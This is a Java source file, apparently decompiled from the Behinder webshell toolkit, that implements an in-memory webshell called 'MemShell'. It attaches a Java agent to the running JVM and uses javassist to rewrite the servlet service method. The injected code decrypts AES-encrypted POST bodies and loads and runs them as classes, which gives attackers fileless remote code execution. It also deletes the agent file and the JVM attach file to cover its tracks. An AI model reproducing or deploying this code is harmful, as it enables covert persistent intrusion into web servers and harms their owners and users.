package net.rebeyond.behinder.payload.java;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.lang.instrument.ClassDefinition;
import java.lang.instrument.Instrumentation;
import java.lang.management.ManagementFactory;
import java.lang.reflect.Method;
import java.net.URI;
import java.nio.file.FileSystem;
import java.nio.file.FileSystems;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import net.rebeyond.behinder.utils.ServerDetector;

public class MemShell {
   public static String whatever;
   private Object Request;
   private Object Response;
   private Object Session;
   public static String type;
   public static String libPath;
   public static String path;
   public static String password;
   public static String antiAgent;

   public boolean equals(Object obj) {
      HashMap result = new HashMap();
      boolean var14 = false;

      Object so;
      Method write;
      label99: {
         try {
            var14 = true;
            System.setProperty("jdk.attach.allowAttachSelf", "true");
            this.fillContext(obj);
            if (type.equals("Agent")) {
               try {
                  this.doAgentShell(Boolean.parseBoolean(antiAgent));
                  result.put("status", "success");
                  result.put("msg", "MemShell Agent Injected Successfully.");
                  var14 = false;
               } catch (Exception var18) {
                  result.put("status", "fail");
                  result.put("msg", var18.getMessage());
                  var14 = false;
               }
            } else if (type.equals("Filter")) {
               var14 = false;
            } else {
               if (type.equals("Servlet")) {
               }

               var14 = false;
            }
            break label99;
         } catch (Exception var19) {
            result.put("status", "fail");
            result.put("msg", var19.getMessage());
            var14 = false;
         } finally {
            if (var14) {
               try {
                  so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
                  write = so.getClass().getMethod("write", byte[].class);
                  write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
                  so.getClass().getMethod("flush").invoke(so);
                  so.getClass().getMethod("close").invoke(so);
               } catch (Exception var15) {
               }

            }
         }

         try {
            so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
            write = so.getClass().getMethod("write", byte[].class);
            write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
            so.getClass().getMethod("flush").invoke(so);
            so.getClass().getMethod("close").invoke(so);
         } catch (Exception var16) {
         }

         return true;
      }

      try {
         so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
         write = so.getClass().getMethod("write", byte[].class);
         write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
         so.getClass().getMethod("flush").invoke(so);
         so.getClass().getMethod("close").invoke(so);
      } catch (Exception var17) {
      }

      return true;
   }

   public static void agentmain(String args, Instrumentation inst) {
      Class[] cLasses = inst.getAllLoadedClasses();
      byte[] data = new byte[0];
      Map targetClasses = new HashMap();
      Map targetClassJavaxMap = new HashMap();
      targetClassJavaxMap.put("methodName", "service");
      List paramJavaxClsStrList = new ArrayList();
      paramJavaxClsStrList.add("javax.servlet.ServletRequest");
      paramJavaxClsStrList.add("javax.servlet.ServletResponse");
      targetClassJavaxMap.put("paramList", paramJavaxClsStrList);
      targetClasses.put("javax.servlet.http.HttpServlet", targetClassJavaxMap);
      Map targetClassJakartaMap = new HashMap();
      targetClassJakartaMap.put("methodName", "service");
      List paramJakartaClsStrList = new ArrayList();
      paramJakartaClsStrList.add("jakarta.servlet.ServletRequest");
      paramJakartaClsStrList.add("jakarta.servlet.ServletResponse");
      targetClassJakartaMap.put("paramList", paramJakartaClsStrList);
      targetClasses.put("javax.servlet.http.HttpServlet", targetClassJavaxMap);
      targetClasses.put("jakarta.servlet.http.HttpServlet", targetClassJakartaMap);
      String getCoreObject = "javax.servlet.http.HttpServletRequest request=(javax.servlet.ServletRequest)$1;\njavax.servlet.http.HttpServletResponse response = (javax.servlet.ServletResponse)$2;\njavax.servlet.http.HttpSession session = request.getSession();\n";
      ClassPool cPool = ClassPool.getDefault();
      if (ServerDetector.isWebLogic()) {
         targetClasses.clear();
         Map targetClassWeblogicMap = new HashMap();
         targetClassWeblogicMap.put("methodName", "execute");
         List paramWeblogicClsStrList = new ArrayList();
         paramWeblogicClsStrList.add("javax.servlet.ServletRequest");
         paramWeblogicClsStrList.add("javax.servlet.ServletResponse");
         targetClassWeblogicMap.put("paramList", paramWeblogicClsStrList);
         targetClasses.put("weblogic.servlet.internal.ServletStubImpl", targetClassWeblogicMap);
      }

      String shellCode = "javax.servlet.http.HttpServletRequest request=(javax.servlet.ServletRequest)$1;\njavax.servlet.http.HttpServletResponse response = (javax.servlet.ServletResponse)$2;\njavax.servlet.http.HttpSession session = request.getSession();\nString pathPattern=\"%s\";\nif (request.getRequestURI().matches(pathPattern))\n{\n\tjava.util.Map obj=new java.util.HashMap();\n\tobj.put(\"request\",request);\n\tobj.put(\"response\",response);\n\tobj.put(\"session\",session);\n    ClassLoader loader=this.getClass().getClassLoader();\n\tif (request.getMethod().equals(\"POST\"))\n\t{\n\t\ttry\n\t\t{\n\t\t\tString k=\"%s\";\n\t\t\tsession.putValue(\"u\",k);\n\t\t\t\n\t\t\tjava.lang.ClassLoader systemLoader=java.lang.ClassLoader.getSystemClassLoader();\n\t\t\tClass cipherCls=systemLoader.loadClass(\"javax.crypto.Cipher\");\n\n\t\t\tObject c=cipherCls.getDeclaredMethod(\"getInstance\",new Class[]{String.class}).invoke((java.lang.Object)cipherCls,new Object[]{\"AES\"});\n\t\t\tObject keyObj=systemLoader.loadClass(\"javax.crypto.spec.SecretKeySpec\").getDeclaredConstructor(new Class[]{byte[].class,String.class}).newInstance(new Object[]{k.getBytes(),\"AES\"});;\n\t\t\t       \n\t\t\tjava.lang.reflect.Method initMethod=cipherCls.getDeclaredMethod(\"init\",new Class[]{int.class,systemLoader.loadClass(\"java.security.Key\")});\n\t\t\tinitMethod.invoke(c,new Object[]{new Integer(2),keyObj});\n\n\t\t\tjava.lang.reflect.Method doFinalMethod=cipherCls.getDeclaredMethod(\"doFinal\",new Class[]{byte[].class});\n            byte[] requestBody=null;\n            try {\n                    Class Base64 = loader.loadClass(\"sun.misc.BASE64Decoder\");\n\t\t\t        Object Decoder = Base64.newInstance();\n                    requestBody=(byte[]) Decoder.getClass().getMethod(\"decodeBuffer\", new Class[]{String.class}).invoke(Decoder, new Object[]{request.getReader().readLine()});\n                } catch (Exception ex) \n                {\n                    Class Base64 = loader.loadClass(\"java.util.Base64\");\n                    Object Decoder = Base64.getDeclaredMethod(\"getDecoder\",new Class[0]).invoke(null, new Object[0]);\n                    requestBody=(byte[])Decoder.getClass().getMethod(\"decode\", new Class[]{String.class}).invoke(Decoder, new Object[]{request.getReader().readLine()});\n                }\n\t\t\t\t\t\t\n\t\t\tbyte[] buf=(byte[])doFinalMethod.invoke(c,new Object[]{requestBody});\n\t\t\tjava.lang.reflect.Method defineMethod=java.lang.ClassLoader.class.getDeclaredMethod(\"defineClass\", new Class[]{String.class,java.nio.ByteBuffer.class,java.security.ProtectionDomain.class});\n\t\t\tdefineMethod.setAccessible(true);\n\t\t\tjava.lang.reflect.Constructor constructor=java.security.SecureClassLoader.class.getDeclaredConstructor(new Class[]{java.lang.ClassLoader.class});\n\t\t\tconstructor.setAccessible(true);\n\t\t\tjava.lang.ClassLoader cl=(java.lang.ClassLoader)constructor.newInstance(new Object[]{loader});\n\t\t\tjava.lang.Class  c=(java.lang.Class)defineMethod.invoke((java.lang.Object)cl,new Object[]{null,java.nio.ByteBuffer.wrap(buf),null});\n\t\t\tc.newInstance().equals(obj);\n\t\t}\n\n\t\tcatch(java.lang.Exception e)\n\t\t{\n\t\t   e.printStackTrace();\n\t\t}\n\t\tcatch(java.lang.Error error)\n\t\t{\n\t\terror.printStackTrace();\n\t\t}\n\t\treturn;\n\t}\t\n}\n";
      Class[] var28 = cLasses;
      int var13 = cLasses.length;

      for(int var14 = 0; var14 < var13; ++var14) {
         Class cls = var28[var14];
         if (targetClasses.keySet().contains(cls.getName())) {
            String targetClassName = cls.getName();

            try {
               String path = new String(base64decode(args.split("\\|")[0]));
               String key = new String(base64decode(args.split("\\|")[1]));
               shellCode = String.format(shellCode, path, key);
               if (targetClassName.equals("jakarta.servlet.http.HttpServlet")) {
                  shellCode = shellCode.replace("javax.servlet", "jakarta.servlet");
               }

               ClassClassPath classPath = new ClassClassPath(cls);
               cPool.insertClassPath(classPath);
               cPool.importPackage("java.lang.reflect.Method");
               cPool.importPackage("javax.crypto.Cipher");
               List paramClsList = new ArrayList();
               Iterator var21 = ((List)((Map)targetClasses.get(targetClassName)).get("paramList")).iterator();

               String methodName;
               while(var21.hasNext()) {
                  methodName = (String)var21.next();
                  paramClsList.add(cPool.get(methodName));
               }

               CtClass cClass = cPool.get(targetClassName);
               methodName = ((Map)targetClasses.get(targetClassName)).get("methodName").toString();
               CtMethod cMethod = cClass.getDeclaredMethod(methodName, (CtClass[])paramClsList.toArray(new CtClass[paramClsList.size()]));
               cMethod.insertBefore(shellCode);
               cClass.detach();
               data = cClass.toBytecode();
               inst.redefineClasses(new ClassDefinition[]{new ClassDefinition(cls, data)});
            } catch (Exception var24) {
               var24.printStackTrace();
            } catch (Error var25) {
               var25.printStackTrace();
            }
         }
      }

   }

   private static void modifyJar(String pathToJAR, String pathToClassInsideJAR, byte[] classBytes) throws Exception {
      String classFileName = pathToClassInsideJAR.replace("\\", "/").substring(0, pathToClassInsideJAR.lastIndexOf(47));
      FileOutputStream fos = new FileOutputStream(classFileName);
      fos.write(classBytes);
      fos.flush();
      fos.close();
      Map launchenv = new HashMap();
      URI launchuri = URI.create("jar:" + (new File(pathToJAR)).toURI());
      launchenv.put("create", "true");
      FileSystem zipfs = FileSystems.newFileSystem(launchuri, launchenv);
      Throwable var8 = null;

      try {
         Path externalClassFile = Paths.get(classFileName);
         Path pathInJarfile = zipfs.getPath(pathToClassInsideJAR);
         Files.copy(externalClassFile, pathInJarfile, StandardCopyOption.REPLACE_EXISTING);
      } catch (Throwable var18) {
         var8 = var18;
         throw var18;
      } finally {
         if (zipfs != null) {
            if (var8 != null) {
               try {
                  zipfs.close();
               } catch (Throwable var17) {
                  var8.addSuppressed(var17);
               }
            } else {
               zipfs.close();
            }
         }

      }

   }

   public void doAgentShell(boolean antiAgent) throws Exception {
      try {
         Class VirtualMachineCls = ClassLoader.getSystemClassLoader().loadClass("com.sun.tools.attach.VirtualMachine");
         Method attachMethod = VirtualMachineCls.getDeclaredMethod("attach", String.class);
         Method loadAgentMethod = VirtualMachineCls.getDeclaredMethod("loadAgent", String.class, String.class);
         Object obj = attachMethod.invoke(VirtualMachineCls, getCurrentPID());
         loadAgentMethod.invoke(obj, libPath, base64encode(path) + "|" + base64encode(password));
         String osInfo = System.getProperty("os.name").toLowerCase();
         if (osInfo.indexOf("windows") < 0 && osInfo.indexOf("winnt") < 0 && osInfo.indexOf("linux") >= 0 && antiAgent) {
            String fileName = "/tmp/.java_pid" + getCurrentPID();
            (new File(fileName)).delete();
         }
      } catch (Exception var12) {
         var12.printStackTrace();
      } catch (Error var13) {
         var13.printStackTrace();
      } finally {
         (new File(libPath)).delete();
      }

   }

   private static String getCurrentPID() {
      String name = ManagementFactory.getRuntimeMXBean().getName();
      String pid = name.split("@")[0];
      return pid;
   }

   private static byte[] base64decode(String base64Text) throws Exception {
      String version = System.getProperty("java.version");
      byte[] result;
      Class Base64;
      Object Decoder;
      if (version.compareTo("1.9") >= 0) {
         Base64 = Class.forName("java.util.Base64");
         Decoder = Base64.getMethod("getDecoder", (Class[])null).invoke(Base64, (Object[])null);
         result = (byte[])((byte[])Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, base64Text));
      } else {
         Base64 = Class.forName("sun.misc.BASE64Decoder");
         Decoder = Base64.newInstance();
         result = (byte[])((byte[])Decoder.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder, base64Text));
      }

      return result;
   }

   private static String base64encode(String content) throws Exception {
      String result = "";
      String version = System.getProperty("java.version");
      Class Base64;
      Object Encoder;
      if (version.compareTo("1.9") >= 0) {
         Base64 = Class.forName("java.util.Base64");
         Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
         result = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, content.getBytes("UTF-8"));
      } else {
         Base64 = Class.forName("sun.misc.BASE64Encoder");
         Encoder = Base64.newInstance();
         result = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, content.getBytes("UTF-8"));
         result = result.replace("\n", "").replace("\r", "");
      }

      return result;
   }

   public static byte[] getFileData(String filePath) throws Exception {
      byte[] fileContent = new byte[0];
      FileInputStream fis = new FileInputStream(new File(filePath));
      byte[] buffer = new byte[10240000];

      int length;
      for(boolean var4 = false; (length = fis.read(buffer)) > 0; fileContent = mergeBytes(fileContent, Arrays.copyOfRange(buffer, 0, length))) {
      }

      fis.close();
      return fileContent;
   }

   public static byte[] mergeBytes(byte[] a, byte[] b) throws Exception {
      ByteArrayOutputStream output = new ByteArrayOutputStream();
      output.write(a);
      output.write(b);
      return output.toByteArray();
   }

   private void fillContext(Object obj) throws Exception {
      if (obj.getClass().getName().indexOf("PageContext") >= 0) {
         this.Request = obj.getClass().getMethod("getRequest").invoke(obj);
         this.Response = obj.getClass().getMethod("getResponse").invoke(obj);
         this.Session = obj.getClass().getMethod("getSession").invoke(obj);
      } else {
         Map objMap = (Map)obj;
         this.Session = objMap.get("session");
         this.Response = objMap.get("response");
         this.Request = objMap.get("request");
      }

      this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
   }

   private String buildJson(Map entity, boolean encode) throws Exception {
      StringBuilder sb = new StringBuilder();
      String version = System.getProperty("java.version");
      sb.append("{");
      Iterator var5 = entity.keySet().iterator();

      while(var5.hasNext()) {
         String key = (String)var5.next();
         sb.append("\"" + key + "\":\"");
         String value = ((String)entity.get(key)).toString();
         if (encode) {
            value = base64encode(value);
         }

         sb.append(value);
         sb.append("\",");
      }

      if (sb.toString().endsWith(",")) {
         sb.setLength(sb.length() - 1);
      }

      sb.append("}");
      return sb.toString();
   }

   private byte[] Encrypt(byte[] bs) throws Exception {
      String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
      byte[] raw = key.getBytes("utf-8");
      SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
      Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
      cipher.init(1, skeySpec);
      byte[] encrypted = cipher.doFinal(bs);
      return encrypted;
   }

   private Object sessionGetAttribute(Object session, String key) {
      Object result = null;

      try {
         result = session.getClass().getMethod("getAttribute", String.class).invoke(session, key);
      } catch (Exception var5) {
      }

      return result;
   }

   private void sessionSetAttribute(Object session, String key, Object value) {
      try {
         session.getClass().getMethod("setAttribute", String.class, Object.class).invoke(session, key, value);
      } catch (Exception var5) {
      }

   }
}
